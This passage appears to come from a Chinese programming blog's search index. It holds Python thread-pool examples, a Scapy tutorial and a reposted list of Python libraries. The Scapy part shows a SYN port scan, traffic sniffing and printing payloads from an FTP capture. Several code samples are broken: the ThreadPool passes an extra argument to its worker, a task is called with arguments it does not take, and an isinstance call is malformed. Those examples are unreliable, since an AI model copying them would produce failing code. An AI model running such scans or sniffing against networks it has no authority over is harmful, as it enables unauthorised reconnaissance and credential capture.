只能发送 bytes 类型的数据   encode将中文的变成byte的\n        print(c.recv(1024))\n    else:\n        break\n\nc.close()\n\n```\n\n","tags":["线程池"],"categories":["Python"]},{"title":"python-简单的线程池的实现","url":"%2Fposts%2F52711%2F","content":"\n\n  \n```python\n# 多进程服务器   创建 销毁\n# 通过提前创建好线程  当任务来了 就分配线程去执行\n\n\"\"\"\n主线程： 相当于生产者，只管向线程池提交任务。\n               并不关心线程池是如何执行任务的。\n               因此，并不关心是哪一个线程执行的这个任务。\n线程池： 相当于消费者，负责接收任务，\n               并将任务分配到一个空闲的线程中去执行。\n\"\"\"\n\nfrom threading import Thread\nfrom queue import Queue\nimport time\n\n\nclass ThreadPool:\n    def __init__(self, n):  # 意味着传啦几次\n        self.queue = Queue()\n        for i in range(n+1):   # 每个线程都去执行类里面的func方法\n            Thread(target=self.work, args=(self.queue, ), daemon=True).start()\n\n    def work(self):\n        while True:\n            func, args, kwargs = self.queue.get()\n            func(*args, **kwargs)\n            self.queue.task_done()\n\n    def apply_async(self, func, args=(), kwargs={}):   # 主线程调用的\n        self.queue.put((func, args, kwargs))   # 扔到队列里面\n\n    def join(self):\n        self.queue.join()\n\ndef task1():\n    time.sleep(2)\n    print(\"111\")\n\ndef task2():\n    time.sleep(2)\n    print(\"222222\")\n\npool = ThreadPool(2)\npool.apply_async(task1)\npool.apply_async(task2)\nprint(\"任务提交完成\")\npool.join()\nprint(\"任务完成\")\n```\n\n","tags":["线程池"],"categories":["Python"]},{"title":"python-可重复利用的线程","url":"%2Fposts%2F20484%2F","content":"\n\n\n\n\n\n\n\n  \n```python\n\nimport threading\nimport queue\n\n\nclass MyThread(threading.Thread):\n    def __init__(self):\n        super().__init__()\n        self.queue = queue.Queue()\n        self.daemon = True  # 守护进程\n        self.start()   #\n\n    def run(self):   # 只有run里的才是子线程执行的\n        while True:\n            func, args, kwargs = self.queue.get()  # 从队列当中获取任务\n            func(*args, **kwargs)\n            self.queue.task_done()\n\n    def apply_async(self, func, args=(), kwargs={}):\n        self.queue.put((func, args, kwargs))\n\n    def join(self, timeout=None):    # 等待所有提交的任务执行完毕\n        self.queue.join()        # 解阻塞\n\ndef print_one():\n    print('111111111')\n\ndef print_two():\n    print('222222222222')\n\n\nif __name__ == '__main__':\n    t = MyThread()\n    t.apply_async(print_one)\n    t.apply_async(print_two, args=(1,2), kwargs={\"a\":1,'b':2})\n\n    t.join()   # 线程的join   等待队列结束\n\n\n\n```\n\n","tags":["线程池"],"categories":["Python"]},{"title":"Python之Scapy","url":"%2Fposts%2F60247%2F","content":"\n\n\n## 关于\n\nScapy是一个Python程序，使用户能够发送，嗅探和剖析并伪造网络数据包。此功能允许构建可以探测，扫描或攻击网络的工具。\n\n换句话说，Scapy是一个功能强大的交互式数据包操作程序。它能够伪造或解码大量协议的数据包，通过线路发送，捕获它们，匹配请求和回复等等。Scapy可以轻松处理大多数经典任务，如扫描，跟踪路由，探测，单元测试，攻击或网络发现。它可以取代hping，arpspoof，arp-sk，arping，p0f甚至是Nmap，tcpdump和tshark的某些部分。Scapy主要做两件事：发送数据包和接收答案。\n\n 在python中可以通过scapy这个库轻松实现构造数据包、发送数据包、分析数据包，为网络编程之利器！\n\n项目地址：https://github.com/secdev/scapy\n\n\n\n## 安装\n\nScapy 有两种使用方式：\n\n1. 直接在shell中使用\n```bash\n# 先下载项目到本地\ngit clone git@github.com:secdev/scapy.git\n# 运行\n./run_scapy\n# 交互式使用\n```\n\n\n\n2. 作为Python的第三方库使用\n```python\n# 安装\npip3 install scapy\n# 导入\nfrom scapy.all import *\n```\n\n   \n\n\n\n## 使用\n\n###### 构造数据包\n\n```python\nfrom scapy.all import *\n\n\n# 2.构造数据包     IP()创建一个默认数据包\n#  ls(IP()) 可以查看IP数据包可以有哪些参数。\n# 其他数据包同理： TCP(),\n\npkt = IP(dst=\"114.114.114.114\")\n\npkt.show()  # 查看数据包信息\n\npkt.summary()   # 方法查看概要信息\n\nhexdump(pkt)    #  查看数据包的字节信息\n\n\n# 使用 '/' 操作符来给数据包加上一层\n# 例如构造一个TCP数据包，在IP层指明数据包的目的地址。在TCP层可以设定数据包的目的端口等等。UDP数据包同理。\ntcpkt = IP(dst=\"114.114.114.114\")/TCP()\ntcpkt.show()\n\n# 数据包的目标端口可以用范围来表示，发送的时候就会发送dport 不同的多个数据包\ntcpkt = IP(dst=\"114.114.114.114\")/TCP(dport=(22,33))\n#  如果设置了多个参数为范围的，最后发送的数据包就是笛卡尔积。\ntcpkt = IP(dst=\"114.114.114.114\")/TCP(dport=(22,33), sport=(4567, 4568))\nfor tcp in tcpkt:\n    print(tcp.dport, tcp.sport)\n\n\n```\n\n\n\n###### 发送数据包 (可能需要管理员权限)\n\n```python\n# 3.发送数据包\n# 发送数据包可能需要管理员权限，使用sudo python3 进入python即可。\n## scapy发送数据包有常用的如下几种方法：\n\"\"\"\nsend(pkt)  发送三层数据包，但不会受到返回的结果(发完就拉倒)。\n\nsr(pkt)  发送三层数据包，返回两个结果，分别是接收到响应的数据包和未收到响应的数据包。\n\nsr1(pkt)  发送三层数据包，仅仅返回接收到响应的数据包。\n\nsendp(pkt)  发送二层数据包。\n\nsrp(pkt)  发送二层数据包，并等待响应。\n\nsrp1(pkt)  发送第二层数据包，并返回响应的数据包\n\n\"\"\"\n# 例如：\nans, uans = sr(pkt)\nprint(ans)\nprint(uans)\n```\n\n\n\n###### 简单应用\n\n```bash\n\n# 4.应用\n# 1）可以构造数据包来实现一个简单的 SYN端口扫描 ，flags=\"S\" 表示发送SYN数据包\nport_scan = IP(dst=\"192.168.0.121\")/TCP(dport=[22,80,135,443,3306,3389], flags=\"S\")\nans, uans = sr(port_scan)\nans.summary()\n'''\n端口返回的flag位为 SA，表示这些端口是开放的。\n而 RA 表示reset ack， 说明这些端口是关闭的。\n【见下面图片】\n'''\n\n\n#  2）实现一个基于TCP的traceroute\nans, uans = sr(IP(dst=\"114.114.114.114\", ttl=(1,20), id=RandShort())/TCP(flags=\"0x2\"))\nfor snd, rcv in ans:\n    print(snd.ttl, rcv.src, isinstance((rcv.payload, TCP))\n\n\n\n#  3) 模拟TCP的三次握手\nsource = IP(dst=\"192.168.0.121\")/TCP(dport=22)\nrsp = sr1(source)\nsource2 = IP(dst=\"192.168.0.121\")/TCP(dport=22, flags=\"A\", seq=rsp.ack, ack=rsp.seq+1)\nrsp2 = sr1(source2)\nprint(rsp2.show())\n\n```\n\n<img src=\"http://image.xpshuai.cn/scapy_port_scan.png\"></img>\n\n\n\n###### 其他\n\n```python\n\n# 5.其他\n# scapy 还可以用来读取网络流量包或监听网卡流量。\n\"\"\"\n1. 使用函数 rdpcap(\"/abc/def/xxxx.pcap\")  可以读取包的内容，\n2. 再使用  haslayer(TCP)  或  haslayer(ICMP)  等等来判断数据包的类型。\n3. 使用  sniff(iface=\"who1\",count=100,filter=\"tcp xxxx\")  可以监听网卡流量，iface声明监听的网卡，filter是过滤条件，count是符合过滤条件的数据包的个数，达到指定的数据包个数后会停止监听，不设count则没有限制，按ctrl-c 结束监听。\n4. sniff也支持无线网卡的监听模式。\n\n\"\"\"\n```\n\n\n\n###### 抓包、分析包\n\n```python\n\"\"\"\nprn指向一个回调函数，意为将收到的包丢给prn指向的函数处理（注意：回调的意义！每收到一个包就丢到回调函数里执行一下，执行完了才再跑回来继续抓包）\n\nfilter为包过滤规则（语法参照tcpdump过滤规则）\n\nstore为是否要存储抓到的包（注意，如果没有存储则不会将抓到的包赋值给a，因为没有存下就没有东西可以赋，此参数默认开启）\n\ntimeout为抓包时长，比如抓30秒就结束（注意：如果没有指定抓包时长则会一直抓下去，程序会一直卡在这里）\n\niface为指定抓包的网卡\n\"\"\"\n\na = sniff(prn=abc, filter='tcp port 80 and ip 192.168.1.1', store=1, timeout=30, iface='eth0')   \n\n# 此函数可以将抓到的包存到本地（注意：将包写入本地不能使用open（'packet.cap', 'r'）,因为open函数只能写入字符串）。\nwrpcap('packet.cap', a)    \n  \n# 此函数可以将本地存储的数据包读取出来\nbbb = rdpcap('/root/Desktop/ftp.cap') \n# 读取出来的对象是由N个数据包组成的可迭代对象，每次迭代一个包\nfor i in bbb:\n    try: \n        # 输出数据包的应用层负载\n        print(i.getlayer('Raw').fields['load'].decode().strip())   \n    except :\n        continue\n```\n\n\n\n先简单了解一下，剩下的后面慢慢学\n\n\n\n> 更多用法见官方文档：https://scapy.readthedocs.io/en/latest/","tags":["Scapy"],"categories":["Python"]},{"title":"python-常用库","url":"%2Fposts%2F1f32c333%2F","content":"\n  \n\n> 转载自：https://www.jianshu.com/p/d25a9169fe86\n\n哈哈哈，我见大佬把这么多库都整理出来了，赶紧转载一下，太厉害啦。\n\n\n\n\n  \n库名称\t\t简介\n\nChardet 字符编码探测器，可以自动检测文本、网页、xml的编码。\n\ncolorama 主要用来给文本添加各种颜色，并且非常简单易用。\n\nPrettytable 主要用于在终端或浏览器端构建格式化的输出。\n\ndifflib，[Python]标准库，计算文本差异Levenshtein，快速计算字符串相似度。\n\nfuzzywuzzy 字符串模糊匹配。\n\nesmre 正则表达式的加速器。\n\nshortuuid 一组简洁URL/UUID函数库。\n\nftfy，Unicode文本工具7\n\nunidecode，ascii和Unicode文本转换函数。\n\nxpinyin，将汉字转换为拼音的函数库\n\npangu.py，调整对中日韩文字当中的字母、数字间距。\n\npyfiglet，Python写的figlet程序，使用字符组成ASCII艺术图片\n\nuniout，提取字符串中可读写的字符\n\nawesome slugify，一个Python slugify库，用于处理Unicode。\n\npython-slugify，转换Unicode为ASCII内码的slugify函数库。\n\nunicode-slugify，生成unicode内码，Django的依赖包。\n\nply，Python版的lex和yacc的解析工具phonenumbers，解析电话号码，格式，存储和验证的国际电话号码。\n\npython-user-agents，浏览器的用户代理（user-agents）的解析器。\n\nsqlparse，SQL解析器。\n\npygments，一个通用的语法高亮工具。\n\npython-nameparser，解析人名，分解为单独的成分。\n\npyparsing，通用解析器生成框架。\n\ntablib，表格数据格式，包括，XLS、CSV，JSON，YAML。\n\npython-docx，docx文档读取，查询和修改，微软Word 2007 / 2008的docx文件。\n\nxlwt/xlrd，读写Excel格式的数据文件。\n\nxlsxwriter，创建Excel格式的xlsx文件。\n\nxlwings，利用Python调用Excelcsvkit，CSV文件工具包。\n\nmarmir，把Python[数据结构]，转化为电子表格。\n\npdfminer，从PDF文件中提取信息。\n\npypdf2， 合并和转换PDF页面的函数库。\n\nPython-Markdown，轻量级标记语言Markdown的Python实现。\n\nMistune，,快速、全功能的纯Python编写的Markdown解释器。\n\ndateutil，标准的Python官方datetime模块的扩展包，字符串日期工具，其中parser是根据字符串解析成\n\ndatetime，而rrule是则是根据定义的规则来生成datetime。\n\narrow,更好的日期和时间处理Python库\n\nchronyk，一个Python 3版函数库，用于解析人写的时间和日期。\n\ndelorean，清理期时间的函数库。\n\nwhen.py，为见的日期和时间，提供人性化的功能。\n\nmoment，类似Moment.js的日期/时间Python库\n\npytz，世界时区，使用tz database时区信息[数据库]\n\nBeautifulSoup，基于Python的HTML/XML解析器，简单易用, 功能很强大,即使是有bug，有问题的html代码，也可以解析。\n\nlxml，快速，易用、灵活的HTML和XML处理库，功能超强，在遇到有缺陷、不规范的xml时，Python自带的xml处理器可能无法解析。报错时，程序会尝试再用lxml的修复模式解析。\n\nhtmlparser，官方版解析HTML DOM树，偶尔搞搞命令行自动表单提交用得上。\n\npyyaml，Python版本的YAML解释器。\n\nhtml5lib，-标准库，解析和序列化HTML文档和片段。\n\npyquery，类似[jQuery]的的HTML解释器函数库。\n\ncssutils，Python CSS库。\n\nMarkupSafe，XML或HTML / XHTML安全字符串标记工具。\n\ncssutils - ACSS library for Python., MarkupSafe - Implements a XML/HTML/XHTMLbleach，漂白，基于HTML的白名单函数库。\n\nxmltodict，类似JSON的XML工具包。\n\nxhtml2pdf，HTML / CSS格式转换器，看生成pdf文档。\n\nuntangle，把XML文档，转换为Python对象，方便访问。\n\n文件处理\n\n库名称简介Mimetypes，Python标准库，映射文件名到MIME类型。\n\nimghdr，Python标准库，确定图像类型。\n\npython-magic，libmagic文件类型识别库，Python接口格式。\n\npath.py，os.path模块的二次封装。\n\nwatchdog，一组API和shell实用程序，用于监视文件系统事件。\n\nUnipath，面向对象的文件/目录的操作工具包。\n\npathlib，-（Python 3.4版已经作为Python标准库），一个跨平台，面向path的函数库。pickle/cPickle,python的pickle模块实现了基本的数据序列和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。\n\ncPickle是[C语言]实现的版本，速度更快。\n\nConfigParser，Python标准库，INI文件解析器。\n\nconfigobj，INI文件解析器。\n\nconfig，分层次配置，logging作者编写。\n\nprofig，多格式配置转换工具。\n\nlogging，Python标准库，日志文件生成管理函数库。\n\nlogbook，logging的替换品。\n\nSentry，实时log服务器。\n\nRaven，哨兵Sentry的Python客户端。\n\nSphinx，斯芬克斯（狮身人面像），Python文档生成器。\n\nreStructuredText，标记语法和解析工具，Docutils组件。\n\nmkdocs，Markdown格式文档生成器。\n\npycco，简单快速、编程风格的文档生成器。\n\npdoc，自动生成的Python库API文档epydoc，从源码注释中生成各种格式文档的工具\n\n图像处理\n\n库名称简介PIL（Python Image Library），基于Python的图像处理库，功能强大，对图形文件的格式支持广泛，内置许多图像处理函数，如图像增强、滤波[算法]等。\n\nPillow，图像处理库，PIL图像库的分支和升级替代产品。\n\nMatplotlib，著名的绘图库，提供了整套和matlab相似的命令API，用以绘制一些高质量的数学二维图形，十分适合交互式地进行制图。\n\nbrewer2mpl，有一个专业的python配色工具包，提供了从美术角度来讲的精美配色。\n\nPyGame基于Python的多媒体开发和游戏软件开发模块，包含大量游戏和图像处理功能。\n\nBox2d，开源的2d物理引擎，愤怒的小鸟就是使用了这款物理引擎进行开发的，Box2d物理引擎内部模拟了一个世界，你可以设置这个世界里的重力，然后往这个世界里添加各种物体，以及他们的一些物理特性，比如质量，摩擦，阻尼等等。\n\nPymunk，类似box2d的开源物理图形模拟库。\n\nOpenCV, 目前最好的开源图像/视觉库，包括图像处理和计算机视觉方面、[机器学习]的很多通用算法。\n\nSimpleCV，计算机视觉开源框架，类似opencv。\n\nVTK，视觉化工具函式库（VTK， Visualization Toolkit）是一个开放源码，跨平台、支援平行处理（VTK曾用于处理大小近乎1个Petabyte的资料，其平台为美国Los Alamos国家实验室所有的具1024个处理器之大型系统）的图形应用函式库。2005年时曾被美国陆军研究实验室用于即时模拟俄罗斯制反导弹战车ZSU23-4受到平面波攻击的情形，其计算节点高达2.5兆个之多。\n\ncgkit,Python Computer Graphics Kit,其module 主要分两个部分\n\n\\1. 与3d相关的一些python module 例如the vector, matrix and quaternion types, the RenderMan bindings, noise functions 这些模块可以在maya houdini nuke blender 等有Python扩展的程序中直接用;\n\n\\2. 提供完整的场景操作的module， 他类似其他三维软件，在内存中保留完整的描述场景的信息。不能直接用于maya 等。\n\nCGAL，Computational Geometry Algorithms Library，计算几何算法库，提供计算几何相关的数据结构和算法，诸如三角剖分（2D约束三角剖分及二维和三维Delaunay三角剖分），Voronoi图（二维和三维的点，2D加权Voronoi图，分割Voronoi图等），多边形（布尔操作，偏置），多面体（布尔运算），曲线整理及其应用，网格生成（二维Delaunay网格生成和三维表面和体积网格生成等），几何处理（表面网格简化，细分和参数化等），凸壳算法（2D，3D和dD），搜索结构（近邻搜索，kd树等），插值，形状分析，拟合，距离等。\n\nAggdraw，开源图像库，几乎涵盖了2d image操作的所有功能，使用起来非常灵活。\n\nPycairo,开源矢量绘图库\n\nCairo开罗的python接口，cairo提供在多个背景下做2-D的绘图，高级的更可以使用硬件加速功能。\n\nwand，Python绑定魔杖工具（MagickWand），C语言API接口。\n\nthumbor， -智能成像工具，可调整大小和翻转图像。\n\nimgSeek，查询相似的图像。\n\npython-qrcode，纯Python的二维码（QR码）生成器。\n\npyBarcode，创建条码，无需PIL模块。\n\npygram，Instagram像图像过滤器。\n\nQuads，基于四叉树的计算机艺术。\n\nnude.py，裸体检测函数。\n\nscikit-image，scikit工具箱的图像处理库。\n\nhmap，图像直方图工具。\n\nbokeh，交互的Web绘图。\n\nplotly，Web协同的Python和Matplotlib绘制。\n\nvincent，文森特，Python Vega的函数库。\n\nd3py，Python绘图库，基于D3.JS, ggplot -API兼容R语言的ggplot2.Kartograph.py，在Python绘制漂亮的SVG地图。\n\npygal， SVG图表的创造者。\n\npygraphviz，Graphviz的Python接口。\n\nFonttlools，ttf字体工具函数包，用于fontforge、ttx等字体软件。\n\n游戏和多媒体\n\n库名称简介audiolazy，数字信号处理（DSP）的Python工具包。\n\naudioread，跨平台（GStreamer + Core Audio + MAD + FFmpeg）音频解码库。\n\nbeets，音乐库管理。dejavu，音频指纹识别算法。\n\nDejavu 听一次音频后就会记录该音频的指纹信息，然后可通过麦克风对输入的音频进行识别是否同一首歌。\n\ndjango-elastic-transcoder,Django +亚马逊elastic转码。\n\neyeD3,音频文件工具，特别是MP3文件包含的ID3元数据。\n\nid3reader，用于读取MP3的元数据。\n\nmutagen，处理音频元数据。\n\npydub，-操纵音频和简单的高层次的接口。\n\npyechonest，Echo Nest API客户端。\n\ntalkbox，语音和信号处理的Python库。\n\nTimeSide，开放的网络音频处理框架。\n\ntinytag，读取音乐文件元数据，包括的MP3，OGG，FLAC和wave文件。\n\nm3u8，用于解析m3u8文件。\n\nmoviepy，多格式视频编辑脚本模块，包括GIF动画。\n\nshorten.tv，视频摘要。scikit视频，SciPy视频处理例程。\n\nGeoDjango,一个世界级的地理Web框架。\n\ngeopy,Geo地理编码的工具箱。\n\npygeoip，纯Python写的GeoIP API。\n\nGeoIP，Python API接口，使用高精度GeoIP Legacy Database数据库。\n\ngeojson，GeoJSON函数库django-countries，一个Django程序，提供国家选择，国旗图标的静态文件，和一个国家的地域模型。\n\nPygame，Python游戏设计模块。\n\nCocos2d，2D游戏框架，演示，和其他的图形/交互应用，基于pyglet。Cocos2d- cocos2d is a framework for building 2D games, demos, and other graphical/interactive applications. It is based on pyglet.,PySDL2，SDL2的封装库。\n\nPanda3D- 3D游戏引擎，迪士尼开发。用C++写的，完全兼容Python。\n\nPyOgre，OGRE 3D渲染引擎，可用于游戏，模拟，任何3D。\n\nPyOpenGL，绑定OpenGL和它相关的API。\n\nPySFML，Python绑定SFMLRenPy，视觉小说引擎。\n\n大数据与科学计算\n\n库名称简介pycuda/opencl，GPU高性能并发计算Pandas，python实现的类似R语言的数据统计、分析平台。基于NumPy和Matplotlib开发的，主要用于数据分析和数据可视化，它的数据结构DataFrame和R语言里的data.frame很像，特别是对于时间序列数据有自己的一套分析机制，非常不错。\n\nOpen Mining，商业智能（BI），Pandas的Web界面。\n\nblaze，NumPy和Pandas大数据界面。\n\nSciPy，开源的Python算法库和数学工具包，SciPy包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。其功能与软件MATLAB、Scilab和GNU Octave类似。Numpy和Scipy常常结合着使用，Python大多数机器学习库都依赖于这两个模块。\n\nScientificPython，一组经过挑选的Python程序模块，用于科学计算，包括几何学（矢量、张量、变换、矢量和张量场），四元数，自动求导数，（线性）插值，多项式，基础统计学，非线性最小二乘拟合，单位计算，Fortran兼容的文本格式，通过VRML的3D显示，以及两个Tk小工具，分别用于绘制线图和3D网格模型。此外还具有到netCDF，MPI和BSPlib库的接口。\n\nNumPy科学计算库，提供了矩阵，线性代数，傅立叶变换等等的解决方案, 最常用的是它的N维数组对象. NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。\n\nCvxopt，最优化计算包，可进行线性规划、二次规划、半正定规划等的计算。\n\nNumba，科学计算速度优化编译器。\n\npymvpa2，是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。\n\nNetworkX，复杂网络的优化软件包。\n\nzipline，交易算法的函数库。\n\nPyDy， Python动态建模函数库。\n\nSymPy,符号数学的Python库。\n\nstatsmodels,Python的统计建模和计量经济学。\n\nastropy,天文学界的Python库。\n\norange，橙色，数据挖掘，数据可视化，通过可视化编程或Python脚本学习机分析。RDKit,化学信息学和机器学习的软件。\n\nOpen Babel，巴贝尔，开放的化学工具箱。\n\ncclib，化学软件包的计算函数库。\n\nBiopython，免费的生物计算工具包。\n\nbccb，生物分析相关的代码集。\n\nbcbio-nextgen，提供完全自动化、高通量、测序分析的工具包。\n\nvisvis, 可视化计算模块库，可进行一维到四维数据的可视化。\n\nMapReduce是Google提出的一个软件[架构]，用于大规模数据集（大于1TB）的并行运算。概念“Map（映射）”和“Reduce（归纳）”，及他们的主要思想，都是从函数式编程语言借来的MapReduce函数库。\n\nFramworks and libraries for MapReduce.,PySpark，[Spark]的Python API。dpark，Spark的Python克隆，Python中的MapReduce框架。\n\nluigi，为批量工作，建立复杂的管道。\n\nmrjob，运行在[Hadoop]，或亚马逊网络服务的，MapReduce工作。\n\n人工智能与机器学习\n\n库名称简介NLTK（natural language toolkit)，是python的自然语言处理工具包。2001年推出，包括了大量的词料库，以及自然语言处理方面的算法实现：分词， 词根计算， 分类， 语义分析等。\n\nPattern，数据挖掘模块，包括自然语言处理，机器学习工具，等等。\n\ntextblob，提供API为自然语言处理、分解NLP任务。基于NLTK和Pattern模块。\n\njieba，结巴，中文分词工具。\n\nsnownlp，用于处理中文文本库。\n\nloso，中文分词函数库。\n\ngenius，中文CRF基础库，条件随机场(conditional random field,简称 CRF),是一种鉴别式机率模型,是随机场的一种,常用于标注或分析序列资料,如自然语言文字或是生物序列。\n\nGensim，一个相当专业的主题模型Python工具包，无论是代码还是文档，可用于如何计算两个文档的相似度LIBSVM,是台湾大学林智仁(Lin Chih-Jen)教授等开发设计的一个简单、易于使用和快速有效的SVM模式识别与回归的软件包，他不但提供了编译好的可在Windows系列系统的执行文件，还提供了源代码，方便改进、修改以及在其它[操作系统]上应用；该软件对SVM所涉及的参数调节相对比较少，提供了很多的默认参数，利用这些默认参数可以解决很多问题；并提供了交互检验(Cross Validation)的功能。该软件可以解决C-SVM、ν-SVM、ε-SVR和ν-SVR等问题，包括基于一对一算法的多类模式识别问题。\n\nscikits.learn，构建在SciPy之上用于机器学习的 Python 模块。它包括简单而高效的工具，可用于数据挖掘和数据分析。涵盖分类，回归和聚类算法，例如SVM， 逻辑回归，朴素贝叶斯，随机森林，k-means等算法，代码和文档都非常不错，在许多Python项目中都有应用。例如在我们熟悉的NLTK中，分类器方面就有专门针对scikit-learn的接口，可以调用scikit-learn的分类算法以及训练数据来训练分类器模型。\n\nPyMC，机器学习采样工具包，scikit-learn似乎是所有人的宠儿，有人认为，PyMC更有魅力。PyMC主要用来做Bayesian分析。\n\nOrange，基于组件的数据挖掘和机器学习软件套装，它的功能即友好，又很强大，快速而又多功能的可视化编程前端，以便浏览数据分析和可视化，包含了完整的一系列的组件以进行数据预处理，并提供了数据帐目，过渡，建模，模式评估和勘探的功能。侧重数据挖掘，可以用可视化语言或Python进行操作，拥有机器学习组件，还具有生物信息学以及文本挖掘的插件。\n\nMilk，机器学习工具箱，其重点是提供监督分类法与几种有效的分类分析：SVMs(基于libsvm)，K-NN，随机森林经济和决策树。它还可以进行特征选择。这些分类可以在许多方面相结合，形成不同的分类系统。对于无监督学习，它提供K-means和affinity propagation聚类算法。\n\nPyMVPA(Multivariate Pattern Analysis in Python),是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。\n\nNuPIC，开源人工智能平台。该项目由Grok（原名 Numenta）公司开发，其中包括了公司的算法和软件架构。NuPIC 的运作接近于人脑，“当模式变化的时候，它会忘掉旧模式，记忆新模式”。如人脑一样，CLA 算法能够适应新的变化。\n\nPylearn2，-基于Theano的机器学习库。\n\nhebel，GPU加速，[深度学习]Python库。\n\ngensim，机器学习库。\n\npybrain，机器学习模块，它的目标是为机器学习任务提供灵活、易应、强大的机器学习算法。pybrain包括神经网络、强化学习(及二者结合)、无监督学习、进化算法。以神经网络为核心，所有的训练方法都以神经网络为一个实例Mahout,是 Apache Software Foundation（ASF） 旗下的一个开源项目，提供一些可扩展的机器学习领域经典算法的实现，旨在帮助开发人员更加方便快捷地创建智能应用程序。Mahout包含许多实现，包括聚类、分类、推荐过滤、频繁子项挖掘。此外，通过使用 Apache Hadoop 库，Mahout 可以有效地扩展到云中。\n\nCrab，灵活的，快速的推荐引擎。\n\npython-recsys，娱乐系统分析，推荐系统。\n\nvowpal_porpoise，Vowpal Wabbit轻量级Python封装。\n\nTheano,用来定义、优化和模拟数学表达式计算，用于高效的解决多维数组的计算问题的python软件包。它使得写深度学习模型更加容易，同时也给出了一些关于在GPU上训练它们的选项。\n\n系统与命令行\n\n库名称简介threading，Python标准线程库，更高级别的线程接口。\n\nenvoy，特使，Python子线程的函数库。\n\nsh，成熟的子线程替换函数库。\n\nsarge，封装线程。\n\nsubprocess,调用shell命令的神器argparse，写命令行脚本必备，强大的命令行差数解析工具timeit，计算代码运行的时间等等unp，命令行工具，解压文件。\n\neventlet开销很少的多线程模块，使用的是 green threads 概念，例如，pool = eventlet.GreenPool(10000) 这样一条语句便创建了一个可以处理 10000 个客户端连接的线程池。类似Gevent线程库Gevent，多线程模块pytools,著名的python通用函数、工具包SendKeys, 键盘鼠标操作模块, 模拟键盘鼠标模拟操作。\n\npyHook,基于Python的“钩子”库，主要用于监听当前电脑上鼠标和键盘的事件。这个库依赖于另一个Python库PyWin32，如同名字所显示的，PyWin32只能运行在Windows平台，所以PyHook也只能运行在Windows平台。\n\npstuil,跨平台地很方便获取和控制系统的进程，以及读取系统的CPU占用内存占用等信息.\n\ncement，一个轻量级的、功能齐全的命令行工具\n\nclick，简单优雅的的命令行接口。\n\nclint，Python命令行工具。\n\ncliff，创造多层次指令的命令行程序框架。\n\nClime， 可以转换任何模块为多的CLI命令程序，无任何配置。\n\ndocopt，Python命令行参数分析器。\n\npycli，命令行应用程序，支持的标准命令行解析，测井，单元[测试]和功能测试。\n\nGooey，打开命令行程序，作为为一个完整的GUI应用程序,cookiecutter，命令行工具，从cookiecutters（项目模板）创建项目。例如，Python包项目，jQuery插件项目。percol，为UNIX传统管道pipe命令，添加交互式选择风格。\n\nrainbowstream，聪明和漂亮的推特客户终端。\n\nDjango Models，Django的一部分SQLAlchemy，Python SQL工具包和对象关系映射。\n\npeewee，小型的ORM解析器。\n\nPonyORM，为ORM提供了一种面向SQL的接口。\n\nMongoEngine，Python对象文件映射，使用[MongoDB]。, Django MongoDB引擎MongoDB , Django后台。\n\ndjango-mongodb-engine，Django后台.redisco,一个简单的模型和容器库，使用[Redis]flywheel，Amazon DynamoDB对象映射。\n\nbutterdb，谷歌电子表格的ORM，Python版。\n\ncelery，芹菜，异步任务队列/工作，基于分布式消息队列。\n\nhuey，休伊，轻量级，多线程任务队列。\n\nmrq，队列先生，分布式任务队列，使用redis & Gevent。\n\nrq，简单的工作队列。\n\nQueue,Queue模块可以用来实现多线程间通讯，让各个线程共享数据，生产者把货物放到Queue中，供消费者（线程）去使用。\n\nsimpleq，简单的，可扩展的队列，Amazon SQS基础队列。\n\nPsyco，超强的python性能优化工具，psyco 的神奇在于它只需要在代码的入口处调用短短两行代码，性能就能提升 40% 或更多，真可谓是立竿见影！如果你的客户觉得你的程序有点慢，敬请不要急着去优化代码，psyco 或许能让他立即改变看法。psyco 堪称 Python 的 jit。fn.py，Python函数编程：缺失的功能享受FP的实现。\n\nfuncy，函数编程工具。\n\nToolz，函数编程工具：迭代器、函数，字典。\n\nCyToolz，Toolz的Cython实现，高性能的函数编程工具。\n\nAnsible，安塞波，极为简单的自动化平台。\n\nSaltStack，基础设施的自动化管理系统。\n\nFabric，织物，一个简单，远程执行和部署的语言工具。\n\nFabtools，Fabric的工具函数。\n\ncuisine，热门的Fabric的工具函数。\n\npsutil，跨平台的过程和系统工具模块。\n\npexpect，控制互动节目。\n\nprovy，易于使用的配置系统的Python。\n\nhoncho，Foreman的Python接口，用于管理procfile应用工具。\n\ngunnery，多任务执行工具，与网络接口的分布式系统。\n\nfig，快速。独立的开发环境中使用泊坞窗。\n\nAPScheduler，轻量级、但功能强大的在线任务调度程序。\n\ndjango-schedule,Django日程应用程序。\n\ndoit,任务流道/生成工具。\n\nJoblib,Python提供的轻量级的流水线工具函数。\n\nPlan，简易生成crontab文件。\n\nSpiff，纯Python实现的，功能强大的工作流引擎。\n\nschedule，Python作业调度。\n\nTaskFlow，有助于使任务执行简单。\n\nctypes，Python标准库，速度更快，Python调用C代码的外部函数接口。\n\ncffi，Python调用C代码外部函数接口，类似于ctypes直接在python程序中调用c程序,但是比ctypes更方便不要求编译成so再调用。\n\nCytoolz，python 加速库SWIG，简化封装和接口生成器。\n\nCython，Python优化静态编译器。\n\nPyPy，Python解释器的 Python实现。\n\nStackless Python，一个增强版本的Python。它使程序员从基于线程的编程方式中获得好处，并避免传统线程所带来的性能与复杂度问题。Stackless为 Python带来的微线程扩展，是一种低开销、轻量级的便利工具Pyston,使用LLVM和现代JIT技术,对python进行性能优化。\n\npythonlibs，非官方的Windows（32 / 64位）的Python扩展包scapy，优秀的数据包处理库。\n\nino，Arduino命令行工具。\n\nPyro，Python的机器人工具包。\n\npluginbase，一个简单而灵活的Python的插件系统。\n\nitsdangerous，数据安全传输工具。\n\nblinker，快速Python中的信号/事件调度系统。\n\npychievements，用于创建和跟踪成果框架。\n\npython-patterns，Python中的设计模式。\n\npefileWindows 